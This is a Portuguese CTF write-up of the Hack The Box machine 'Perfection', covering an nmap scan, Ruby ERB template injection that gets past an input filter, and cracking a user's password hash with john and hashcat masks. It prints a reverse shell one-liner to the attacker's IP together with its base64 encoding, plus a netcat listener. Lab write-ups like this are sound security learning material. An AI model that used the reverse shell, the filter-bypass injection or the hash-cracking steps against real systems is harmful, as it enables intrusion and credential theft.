---
description: CTF do Hack The Box como fiz e anotações.
title: HackTheBox - Perfection - Fácil
date: 2024-03-29 01:12:00 +/-0300
categories: [CTF, HackTheBox]
tags: [ctf, hackthebox, linux, sudo, web, ruby, stti, facil]     # TAG names should always be lowercase
show_image_post: true
---
![logo](/assets/img/perfection/perfection1.png){: w="100" h="100" .left}

---
# **CTF - Perfection**
---
---
## **Enumeração**

### nmap

```shell
─ sudo nmap -sV -Pn -sS --min-rate 10000 -stats-every 5 -p- -oN nmap 10.129.121.163
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-02 19:22 -03
Nmap scan report for 10.129.121.163
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)                   
80/tcp open  http    nginx                                                                          
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                             
                                                                                                    
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .      
Nmap done: 1 IP address (1 host up) scanned in 18.63 seconds   
```  
{: .nolineno }     

porta 80

![alt text](/assets/img/perfection/1.png)

Possíveis usuários Tina Smith, Susan Miller

FFUF sem resultados

### Burp

na calculadora do site

![alt text](/assets/img/perfection/calc.png)

Qualquer tentativa de injetar código recebe o retorno de `Malicious input blocked`


![alt text](/assets/img/perfection/calc2.png)

![alt text](/assets/img/perfection/2.png)

**SSTI (Server Side Template Injection)**

<https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby>

Payload  
o base64 após o echo, coloquei um ping -c 5 meu ip em tun0, para testar se o código estava sendo executado, e capturei com `tcpdump -i tun0 icmp`

![alt text](/assets/img/perfection/3.png)

### tcpdump

![alt text](/assets/img/perfection/4.png)

## **Acesso/Foothold**

### reverse shell

Para o payload funcionar a calculadora tem que fornecer os resultados corretamente.  
![alt text](/assets/img/perfection/5.png)

No caso usei esse que não gerou nenhum carácter de "+" em base64.  
Gerado através de <https://n00br00t.github.io/sh/>  
`sh -i >& /dev/tcp/10.10.14.126/4443 0>&1`  
Em base64  
`c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTI2LzQ0NDMgMD4mMQ==`

listado a porta 4443 com netcat pra receber a reverse shell

`rlwrap nc -lvnp 4443`  

### user flag

![alt text](/assets/img/perfection/6.png)

## **Exploração**

db encontrado na home de susan.

```shell
susan@perfection:~$ ls -R
ls -R
.:
Migration  ruby_app  user.txt

./Migration:
pupilpath_credentials.db
```
{: .nolineno }


Hashs de usuários no db.

```shell
susan@perfection:~/Migration$ strings pupilpath_credentials.db 
strings pupilpath_credentials.db 
SQLite format 3
tableusersusers
CREATE TABLE users (
id INTEGER PRIMARY KEY,
name TEXT,
password TEXT
Stephen Locke154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8S
David Lawrenceff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87aP
Harry Tylerd33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393O
Tina Smithdd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57Q
Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
susan@perfection:~/Migration$ 
```
{: .nolineno }

E-mail de susan

```shell
susan@perfection:/var/mail$ cat susan
cat susan
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```
{: .nolineno }


Seguindo a policies de senha:
`{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}` seria:

susan_nasus_XXXXXXXXX  
X= números

usando john pra quebrar a hash onde fica os números.

Comando caso preferir hashcat

`hashcat -m 1400 -a 3 hashfile susan_nasus_?d?d?d?d?d?d?d?d?d`  

```shell
─ hash-identifier abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023fabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
 
Possible Hashs:
[+] SHA-512
[+] Whirlpool

Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
```
{: .nolineno }

## **Escalação Privilégio**

### john

`john hashsusan --mask='susan_nasus_?d?d?d?d?d?d?d?d?d' --format=Raw-SHA256`  

![alt text](/assets/img/perfection/7.png)

### root flag

![alt text](/assets/img/perfection/8.png)



**Conhecimentos adquiridos:**  
- Sobre a vulnerabilidade e o payload com regex (SSTI)
- Crack com mask no john

![alt text](/assets/img/perfection/9.png)

